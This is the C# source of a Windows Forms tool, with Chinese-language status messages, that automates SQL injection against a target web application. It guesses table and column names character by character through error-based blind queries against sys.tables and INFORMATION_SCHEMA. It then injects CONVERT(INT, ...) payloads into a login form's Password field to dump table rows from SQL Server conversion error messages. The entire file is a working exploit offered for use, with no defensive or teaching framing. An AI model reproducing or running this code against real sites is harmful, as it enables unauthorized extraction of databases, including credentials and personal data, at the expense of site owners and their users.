using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace Guessing
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static string GetResponseBody(HttpWebResponse resp)
        {
            using (var respStream = new StreamReader(resp.GetResponseStream()))
            {
                return respStream.ReadToEnd();
            }
        }

        private void GuessTableName()
        {
            txtTableName.Text = string.Empty;
            var guessTableNameSQL = ",case when (SELECT Top 1 substring(A2.name, {0}, 1) From (SELECT Top {1} A1.name FROM sys.tables A1 Order By A1.name ) A2 Order By A2.name Desc) = '{2}' then 1 else convert(int, 'x') end;";
            for(int i = 1; i <= 256; i++)
            {
                bool isFound = false;
                for (char c = 'A'; c <= 'Z'; c++)
                {
                    Application.DoEvents();
                    string url = $"{txtURL.Text}{string.Format(guessTableNameSQL, i, txtTableIdx.Text,  c)}";
                    var req = (HttpWebRequest)WebRequest.Create(url);
                    string respBody;
                    try
                    {
                        using (var resp = (HttpWebResponse)req.GetResponse())
                        {
                            respBody = GetResponseBody(resp);
                        }
                    }
                    catch (WebException ex)
                    {
                        respBody = GetResponseBody((HttpWebResponse)ex.Response);
                    }

                    if (!respBody.Contains("Sorry, an error occurred while processing your request"))
                    {
                        txtTableName.Text += c;
                        txtStatus.Text = $"猜到 Table Name 第{i}字元為{c}";
                        isFound = true;
                        break;
                    }
                }
                if (!isFound) break;
            }
            
        }

        private void GuessTableColumns()
        {
            if(string.IsNullOrWhiteSpace(txtTableName.Text.Trim()))
            {
                MessageBox.Show("請輸入 Table Name");
                return;
            }
            txtColumns.Text = string.Empty;
            var guessColumnNameSQL = @",case when (SELECT Top 1 substring(A2.COLUMN_NAME, {0}, 1) From (SELECT Top {1} A1.COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS A1 WHERE A1.TABLE_NAME = '{2}' Order By A1.COLUMN_NAME ) A2 Order By A2.COLUMN_NAME Desc) = '{3}' then 1 else convert(int, 'x') end;";
            string preColumnName = string.Empty;
            for(int cidx = 1; cidx <= 256; cidx++)
            {
                string columnName = string.Empty;
                for (int i = 1; i <= 256; i++)
                {
                    bool isFound = false;
                    for (char c = 'A'; c <= 'Z'; c++)
                    {
                        Application.DoEvents();
                        string url = $"{txtURL.Text}{string.Format(guessColumnNameSQL, i, cidx,  txtTableName.Text, c)}";
                        var req = (HttpWebRequest)WebRequest.Create(url);
                        string respBody;
                        try
                        {
                            using (var resp = (HttpWebResponse)req.GetResponse())
                            {
                                respBody = GetResponseBody(resp);
                            }
                        }
                        catch (WebException ex)
                        {
                            respBody = GetResponseBody((HttpWebResponse)ex.Response);
                        }

                        if (!respBody.Contains("Sorry, an error occurred while processing your request"))
                        {
                            columnName += c;
                            txtStatus.Text = $"猜到Column Name第{i}字元為{c}";
                            isFound = true;
                            break;
                        }
                    }
                    if (!isFound) break;
                }
                if (string.IsNullOrWhiteSpace(columnName) || preColumnName == columnName) break;
                txtColumns.Text += columnName + Environment.NewLine;
                preColumnName = columnName;
            }
        }

        private void btnGuessTableName_Click_1(object sender, EventArgs e)
        {
            GuessTableName();
        }

        private void btnGuessColumns_Click_1(object sender, EventArgs e)
        {
            GuessTableColumns();
        }

        private void GetTableData()
        {
            var tableName = txtTableName.Text.Trim();
            if (string.IsNullOrWhiteSpace(tableName))
            {
                MessageBox.Show("請先在前Tab取得 TableName");
                return;
            }
            var loginUrl = txtLoginUrl.Text.Trim();
            var email = txtLoginEmail.Text.Trim();
            var sortedColumnName = txtSortedColumn.Text.Trim();

            
            var columnName = string.Empty;

            var columns = txtColumns.Text.Split(new string[]{ Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            DataTable dt = new DataTable();
            foreach(var col in columns)
            {
                dt.Columns.Add(col);
            }
            var errorStartMsgs = new string[] { 
                "Conversion failed when converting the varchar value '" ,
                "Conversion failed when converting the nvarchar value '"
            };
            var errorEndMsg = "]'";
            var lastColumnValue = string.Empty;
            //data count
            int maxDataCount = 50;
            for (int i = 1; i <= maxDataCount; i++)
            {
                var req = (HttpWebRequest)WebRequest.Create(loginUrl);
                req.Method = "POST";
                req.ContentType = "application/x-www-form-urlencoded";
                var pwd = $"' + CONVERT(INT,  (SELECT Top 1 A2.{sortedColumnName} From (SELECT Top {i} * FROM {tableName} A1 Order By A1.{sortedColumnName} ) A2 Order By A2.{sortedColumnName} Desc) + ']')--'";
                var postData = string.Format("Email={0}&Password={1}", HttpUtility.UrlEncode(email), HttpUtility.UrlEncode(pwd));
                var byteArray = Encoding.UTF8.GetBytes(postData);
                req.ContentLength = byteArray.Length;
                var dataStream = req.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Close();
                string respBody;
                try
                {
                    using (var resp = (HttpWebResponse)req.GetResponse())
                    {
                        respBody = GetResponseBody(resp);
                    }
                }
                catch (WebException e)
                {
                    respBody = GetResponseBody((HttpWebResponse)e.Response);
                }
                var startMsg = string.Empty;
                var startMsgPosIndex = -1;
                foreach(var s in errorStartMsgs)
                {
                    startMsgPosIndex = respBody.IndexOf(s);
                    if (startMsgPosIndex > -1)
                    {
                        startMsg = s;
                        break;
                    }
                }
                if (startMsgPosIndex > -1)
                {
                    //get table data from error message
                    int dataStart = startMsgPosIndex + startMsg.Length;
                    var data = respBody.Substring(dataStart, respBody.IndexOf(errorEndMsg) - dataStart);
                    if(string.Compare(lastColumnValue, data) == 0)
                    {
                        //end of data
                        break;
                    }
                    var dr = dt.NewRow();
                    dr[sortedColumnName] = data;
                    dt.Rows.Add(dr);
                    lastColumnValue = data;
                }
                else
                {
                    txtGetDataStatus.Text = respBody;
                    return;
                }
            }
            

            foreach (var col in columns)
            {
                if (string.Compare(col, sortedColumnName, true)==0)
                    continue;
                foreach (DataRow dr in dt.Rows)
                {
                    var req = (HttpWebRequest)WebRequest.Create(loginUrl);
                    req.Method = "POST";
                    req.ContentType = "application/x-www-form-urlencoded";
                    var dataKey = dr[sortedColumnName].ToString();
                    var pwd = $"' + CONVERT(INT, (SELECT A1.{col} FROM {tableName} A1 WHERE A1.{sortedColumnName} = '{dataKey}') + ']')--'";
                    var postData = string.Format("Email={0}&Password={1}", HttpUtility.UrlEncode(email), HttpUtility.UrlEncode(pwd));
                    var byteArray = Encoding.UTF8.GetBytes(postData);
                    req.ContentLength = byteArray.Length;
                    var dataStream = req.GetRequestStream();
                    dataStream.Write(byteArray, 0, byteArray.Length);
                    dataStream.Close();
                    string respBody;
                    try
                    {
                        using (var resp = (HttpWebResponse)req.GetResponse())
                        {
                            respBody = GetResponseBody(resp);
                        }
                    }
                    catch (WebException e)
                    {
                        respBody = GetResponseBody((HttpWebResponse)e.Response);
                    }
                    var startMsg = string.Empty;
                    var startMsgPosIndex = -1;
                    foreach (var s in errorStartMsgs)
                    {
                        startMsgPosIndex = respBody.IndexOf(s);
                        if (startMsgPosIndex > -1)
                        {
                            startMsg = s;
                            break;
                        }
                    }
                    if (startMsgPosIndex>-1)
                    {
                        int dataStart = startMsgPosIndex + startMsg.Length;
                        int dataEnd = respBody.IndexOf(errorEndMsg);
                        if (dataEnd > 0)
                        {
                            var data = respBody.Substring(dataStart, dataEnd - dataStart);
                            dr.SetField(col, data);
                        }
                        
                    }
                }
            }
            grdTable.DataSource = dt;

        }

        private void btnGetTableData_Click(object sender, EventArgs e)
        {
            GetTableData();
        }
    }
}
